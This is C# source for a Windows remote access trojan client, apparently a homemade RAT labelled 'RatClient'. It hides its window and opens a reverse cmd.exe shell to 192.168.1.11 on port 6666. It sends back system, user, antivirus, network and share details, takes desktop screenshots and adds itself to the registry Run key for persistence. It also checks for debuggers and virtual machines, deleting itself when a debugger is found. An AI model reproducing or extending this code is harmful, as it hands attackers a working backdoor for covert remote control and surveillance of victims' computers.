using System;

using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Management;
using System.Drawing.Imaging;
using System.Threading;
using System.Collections.Generic;
using System.Net.NetworkInformation;
using System.Security.Principal;
using System.Net;
using System.Linq;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;


namespace test
{
    public partial class Form1 : Form
    {
        static TcpClient tcpClient;
        static NetworkStream networkStream;
        static StreamWriter streamWriter;
        static StreamReader streamReader;
        static Process processCmd;
        static StringBuilder strInput;
        static Thread th_getinfo;

        public Form1()
        {
            InitializeComponent();
        }

        [DllImport("Kernel32.dll")]
        public static extern bool IsDebuggerPresent();

        [DllImport("ntdll.dll")]

        public static extern int NtQueryInformationProcess(
            IntPtr prochandle,
            int ProcessInformationClass,
            IntPtr ProcessInformation,
            uint ProcessInformationLength,
            ref uint ReturnLength

            );

        [StructLayout(LayoutKind.Sequential)]

        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;

        }

        public static void Contingency()
        {
            IntPtr prochandle = Process.GetCurrentProcess().Handle;


            uint size = (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION));

            IntPtr pbiptr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)));

            uint returnlength = 0;

            NtQueryInformationProcess(
                prochandle,
                0,
                pbiptr,
                size,
                ref returnlength
                );

            PROCESS_BASIC_INFORMATION pbi = (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pbiptr, typeof(PROCESS_BASIC_INFORMATION));

            IntPtr pebptr = pbi.PebBaseAddress;

            bool condi = Marshal.ReadByte(pebptr + 2) == 1;
            if (condi)
            {
                try
                {
                    
                    
                    string batch = Path.GetTempFileName() + ".bat";
                    string path = Process.GetCurrentProcess().MainModule.FileName;
                    using (StreamWriter sw = File.CreateText(batch))
                    {
                        sw.WriteLine($"ping 127.0.0.1 -n 2 > nul && del /f \"{path}\" && del \"{batch}\"");
                    }
                    Process.Start(new ProcessStartInfo()
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/C \"{batch}\"",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    });
                    Environment.Exit(0);
                }
                catch {  };


            }
        }
        private enum command
        {
            SHUTDOWNCLIENT = 5,
            GETINFO = 6
        }
        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            while (true)
            {
                Contingency();
                RunClient();
                System.Threading.Thread.Sleep(5000); 
            }

        }

        private static void RunClient()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();


            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect("192.168.1.11", 6666);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception) { return; } 

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    string line = streamReader.ReadLine();
                    Int16 intCommand = 0;

                    
                    intCommand = GetCommandFromLine(line);


                    

                    switch ((command)intCommand)
                    {
                        
                        case command.GETINFO:
                            th_getinfo = new Thread(new ThreadStart(GatherInfo));
                            th_getinfo.Start(); break;

                        case command.SHUTDOWNCLIENT:
                            streamWriter.Flush();
                            Cleanup();
                            System.Environment.Exit(System.Environment.ExitCode);
                            break;
                    }

                    strInput.Append(line);
                    if (strInput.ToString().LastIndexOf("isdebug") >= 0) Contingency();
                    if (strInput.ToString().LastIndexOf("userinfo") >= 0) UserID();
                    if (strInput.ToString().LastIndexOf("testvm") >= 0) IsRunningInVirtualMachine();
                    if (strInput.ToString().LastIndexOf("netinfo") >= 0) NetworkInfo();
                    if (strInput.ToString().LastIndexOf("setpersist") >= 0) persist();
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (strInput.ToString().IndexOf("getinfo") >= 0) GatherInfo();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }
        }
        private static void GatherInfo()
        {
            streamWriter.WriteLine("Machine Name: " + Environment.MachineName);
            streamWriter.WriteLine("OS Version: " + Environment.OSVersion);
            streamWriter.WriteLine("Processor Count: " + Environment.ProcessorCount);
            streamWriter.WriteLine("System Directory: " + Environment.SystemDirectory);
            streamWriter.WriteLine("User Domain Name: " + Environment.UserDomainName);
            streamWriter.WriteLine("User Inactive: " + Environment.UserInteractive);
            streamWriter.WriteLine("User Name: " + Environment.UserName);

            ManagementObjectSearcher searcher1 = new ManagementObjectSearcher("select * from Win32_Processor");
            foreach (ManagementObject obj in searcher1.Get())
            {
                streamWriter.WriteLine("CPU Name: " + obj["Name"]);
                streamWriter.WriteLine("CPU Cores: " + obj["NumberOfCores"]);
                streamWriter.WriteLine("CPU Threads: " + obj["ThreadCount"]);
            }
            ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct");
            foreach (ManagementBaseObject obj in antiVirusSearch.Get())
                {
                List<string> av = new List<string>();
                foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
                    streamWriter.WriteLine("Detected! : " + obj["displayName"].ToString());
                if (av.Count == 0)
                {
                    streamWriter.WriteLine("No AV Detected");
                }
                else
                {
                    Contingency();
                }
                
            }
                    ManagementObjectSearcher searcher2 = new ManagementObjectSearcher("select * from Win32_ComputerSystem");
            foreach (ManagementObject obj in searcher2.Get())
            {
                streamWriter.WriteLine("Total Physical Memory: " + Math.Round(Convert.ToDouble(obj["TotalPhysicalMemory"]) / (1024 * 1024 * 1024), 2) + " GB");
            }

            ManagementObjectSearcher searcher3 = new ManagementObjectSearcher("select * from Win32_Share");
            foreach (ManagementObject share in searcher3.Get())
            {
                streamWriter.WriteLine("Network Shares: " + share["Name"]);
            }

            using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                }
                bmp.Save("desktop_screenshot.jpg", ImageFormat.Jpeg);
                streamWriter.WriteLine("Desktop screenshot saved");
            }
        }

        public static void NetworkInfo()
        {
            NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
            streamWriter.WriteLine("Network Interfaces: ");
            foreach (NetworkInterface adapter in adapters) 
            { 
              streamWriter.WriteLine($"    Name: {adapter.Name}");
              streamWriter.WriteLine($"    Description: {adapter.Description}");
              streamWriter.WriteLine($"    Status: {adapter.OperationalStatus}");
              streamWriter.WriteLine($"    MAC Addr: {adapter.GetPhysicalAddress()}");

              string internalIp = Dns.GetHostAddresses(Dns.GetHostName()).FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)
                    ?.ToString();
                streamWriter.WriteLine($"Internal IP Addr: {internalIp}");


               streamWriter.Flush();
            }

            WebClient client = new WebClient();
            string externalIpRaw = client.DownloadString("https://ifconfig.me/ip");
            string externalIp = Regex.Match(externalIpRaw, @"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}").Value;
            streamWriter.WriteLine($"External IP Address: {externalIp}");

        }

        private static void IsRunningInVirtualMachine()
        {
            var systemManufacturer = new ManagementObjectSearcher("SELECT Manufacturer FROM Win32_ComputerSystem").Get().OfType<ManagementObject>().FirstOrDefault()?["Manufacturer"]?.ToString();
            var systemModel = new ManagementObjectSearcher("SELECT Model FROM Win32_ComputerSystem").Get().OfType<ManagementObject>().FirstOrDefault()?["Model"]?.ToString();
            var videoControllerName = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController").Get().OfType<ManagementObject>().FirstOrDefault()?["Name"]?.ToString();

            streamWriter.WriteLine(systemManufacturer?.ToLower().Contains("vmware") == true);
            streamWriter.WriteLine(systemModel?.ToUpperInvariant().Contains("VIRTUAL") == true && systemManufacturer?.ToLower() == "microsoft corporation");
            streamWriter.WriteLine(videoControllerName?.ToLower().Contains("vmware") == true && videoControllerName?.ToLower().Contains("vbox") == true);
            streamWriter.Flush();
        }
        public static void UserID()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            streamWriter.WriteLine("User Profile Info: ");
            streamWriter.WriteLine($"   Name: {identity.Name}");
            streamWriter.WriteLine($"   Authentication Type: {identity.AuthenticationType}");
            streamWriter.WriteLine($"   Is Authenticated: {identity.IsAuthenticated}");
            streamWriter.WriteLine($"   Is Guest: {identity.IsGuest}");
            streamWriter.WriteLine($"   Is System: {identity.IsSystem}");   
            streamWriter.Flush();
        }
        private static void persist()
        {
            try
            {

                Microsoft.Win32.RegistryKey regKey =
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                regKey.SetValue("RatClient", Process.GetCurrentProcess().MainModule.FileName);
                regKey.Dispose();
                regKey.Close();


            }
            catch (Exception) { };
        }

        private static void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }
        private static void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private static Int16 GetCommandFromLine(string strline)
        {
            Int16 intExtractedCommand = 0;
            int i; Char character;
            StringBuilder stringBuilder = new StringBuilder();
            
            for (i = 0; i < strline.Length; i++)
            {
                character = Convert.ToChar(strline[i]);
                if (Char.IsDigit(character))
                {
                    stringBuilder.Append(character);
                }
            }
            
            try
            {
                intExtractedCommand =
                Convert.ToInt16(stringBuilder.ToString());
            }
            catch (Exception) { }
            return intExtractedCommand;
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }
            }
        }
    }
}

